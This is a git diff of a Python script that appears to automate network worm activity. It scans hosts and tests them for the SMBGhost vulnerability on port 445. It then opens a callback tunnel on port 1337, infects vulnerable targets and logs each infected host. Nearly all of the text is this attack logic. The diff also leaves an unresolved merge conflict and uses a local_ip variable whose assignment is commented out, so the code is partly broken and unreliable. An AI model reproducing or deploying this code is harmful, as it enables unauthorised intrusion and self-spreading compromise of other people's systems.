@@ -1,4 +1,8 @@
+<<<<<<< HEAD
 import pickle, os, platform
+=======
+import pickle, time
+>>>>>>> refs/remotes/origin/main
 import armory.SMBGhost.cve20220796scanner as cve20220796scanner
 from sniff import sniff
 from infect import infect
@@ -18,26 +22,30 @@ def main():
             print("Scanning Host:{} for port service".format(target_ip.address))
             if target_ip.address in target_port_details.keys():
                 for running_port in target_port_details[target_ip.address]["ports"]:
-                    print("Host: {} - running port:{}".format(target_ip.address, running_port))
+                    port = running_port["portid"]
+                    print("Host: {} - running port:{}".format(target_ip.address, port))
                     if not target_ip.address in not_testing_targets:
-                        attack = cve20220796scanner.is_vulnerable(target_ip.address)
+                        attack = (cve20220796scanner.is_vulnerable(target_ip.address) and port == "445")
                         if attack:
                             print("start to attack")
-                            local_ip = "0.0.0.0"
+                            #local_ip = "0.0.0.0"
                             print("attacking port{}".format(running_port))
                             listening_port = 1337
                             tunnel = comm.tunnel(local_ip, listening_port)
                             tunnel.start()
-                            infection = infect(target_ip.address,running_port, local_ip, listening_port)
+                            time.sleep(1)
+                            infection = infect(target_ip.address,int(port), local_ip, listening_port)
                             infection.start()
                             
                             infection.join()
                             tunnel.close_client_connection(target_ip.address)
                             
                             if local_ip in log:
-                                log[local_ip]["infects"].update({target_ip.addres:True})
+                                log[local_ip]["infects"].update({target_ip.address:True})
                             else:
                                 log[local_ip] = {"status":True,"infects":{}}
+                            unload_log(log)
+                            tunnel.close_client_connection(target_ip.address)
 
 def load_log():
     log = {}
